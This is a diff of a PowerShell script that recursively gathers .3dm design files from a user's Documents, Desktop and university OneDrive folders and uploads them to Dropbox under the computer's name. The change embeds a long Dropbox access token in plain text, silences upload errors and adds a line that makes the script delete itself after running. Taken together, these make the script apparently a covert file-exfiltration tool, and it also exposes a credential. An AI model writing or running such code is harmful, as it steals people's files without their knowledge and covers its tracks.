@@ -1,8 +1,10 @@
 # Force TLS 1.2
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# Dropbox configuration
-$accessToken = $db
+# Dropbox Token (embedded in script)
+$db = 'sl.u.AFpXzODGR12nno_SZRpIjNrpHr4odxS-z9YwapHDPDBwtB9gFrJYFQwPbtNwmVskz8leYPzFCBgj3l0OBPj6Sa8vu-WQg6a-Fc2ARO_xIT7jrbRO09tlDpVRnkkIDYpqGtd1EGd3ZdO0rVdUqIjE811yjlaZ7fxjI-7SwmOHyul8EdUh9y32CEpZhTZJij2d1KLDLIAbwal1s7pMqbuFvJn-BMzH66c4oLQYAbtvX3Vp8SEcaenb1CPagunXup1c5BhFOQPw1QeqYoCQXawC65DcxOjok-aIZAHdlP-ZgaHoNVDXAL_xwIYhS18pucEP6kpaaspR24miFBXaiEur1VLglGqWeAbrB2d4y_YIbAStUXVNyQ7_25C9r5PS-3ey2cnBFEDH8lLB2PpXj7XIkpspvYsqMAvs1N3Ro6pZ1ebU5mcsY1MuJ8J0nps3xuaNd8HFt5QOyIXaDm6v8NBo98lH3jw1jM6M1zU4EZWgo68YKPyhZ5ny2faH0mFF4a1Ekt16zw3k00FibpSVil39l7XPaswjJpOVF5LO2h2Te7YTlQS0QIXiILofMjPvkSxADYWHGqjsx5VnB6ooKAM7kJfN7OVco97JH8gafYZthwtkuv9UPOamibFgqFqSYM3cq5GHbFKHfy3POpolK5tka9HGUsYcbjTSQRV6dY8VvDXX9X8VC8ilYhiuTvoWGlf_14Ji8dXWppP3ATHTN1j0YBjxt49AGmzYwGYCdLOY4PbBbE57uMg3gHWYuPq1FxZN46D5qudZgxZG34iGRNTflTX7wCYrzIG7tnTh-k1nGPykAfngjtF_n9ZTifNc7FoZTTkkk2K693PmNFwdJ3g9OpNaAUY00uRkskXBXCI2efpBBW2en0gylaXrBvugr_CGz_bTbm-IdyXTwTTdmdmPX2JvLwAqxuTzJYOcvXTyRzVsQaSWfDtZchCJkaH3GfEKscorYsPR4mpB3UQ_3mX2_2kyATfcg0ZE7EZiq65PIjrp74te7K7WRwuAQjNIgpvq3cjIwhHMEKpRr33e-K9WejU5Z7c-Hn4jN19K-LBOBeYk5WEY22UEicuxYjMFgQlqynLrVqpQEGr0LE37mjEaADjZiZ7VPqp9WPLLB2nJ40E33nyhuGWHns7HvWlRwQlkxtnB7nEG85BASORjAhY_-h5da1JFbBbULYtzqGSpRtf2wp37Oagtf7mDc2HO7yg7PFKhm5SNDoFLkOd4DQ-BfqjELK_JNWoxjyu9RFQpc4TxyeGhCqdWWcRCJh8vCCuWDtojjOLIV8fnPSR_KiOJvAx_y9uyaCwSJvLvOBNOazDHXtAB10HYvIqQNX8AUtkHjPx7UYZrj2w68L3TLni-nIAICruaQLrRWKE3XYcUxayIu_ojfy8KyxfFjAS6u7yi2llR6vtpTkMzs_qN1WPz64p-Ef01WDz5JC2lf5uiEUAs5Q'
+
+# Folders to search for .3dm files
 $localFolders = @(
     "$env:USERPROFILE\Documents",
     "$env:USERPROFILE\Desktop",
@@ -10,10 +12,10 @@ $localFolders = @(
     "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
 )
 
-# Create folder in Dropbox
+# Create Dropbox folder
 $computerName = $env:COMPUTERNAME
 $headers = @{
-    "Authorization" = "Bearer $accessToken"
+    "Authorization" = "Bearer $db"
     "Content-Type" = "application/json"
 }
 $folderBody = @{
@@ -22,10 +24,10 @@ $folderBody = @{
 } | ConvertTo-Json
 
 try {
-    Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/create_folder_v2" -Method Post -Headers $headers -Body $folderBody
-} catch { <# Folder likely exists #> }
+    Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/create_folder_v2" -Method Post -Headers $headers -Body $folderBody | Out-Null
+} catch { <# Silent fail if folder exists #> }
 
-# Upload only .3dm files
+# Upload .3dm files
 $headers["Content-Type"] = "application/octet-stream"
 foreach ($folder in $localFolders) {
     Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
@@ -44,9 +46,9 @@ foreach ($folder in $localFolders) {
         try {
             $fileBytes = [System.IO.File]::ReadAllBytes($_.FullName)
             Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileBytes | Out-Null
-        } catch { <# Silent failure #> }
+        } catch { <# Silent fail if upload fails #> }
     }
 }
 
-# Keep window open for debugging (remove in production)
-Start-Sleep -Seconds 30
+# Self-delete script (optional)
+Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
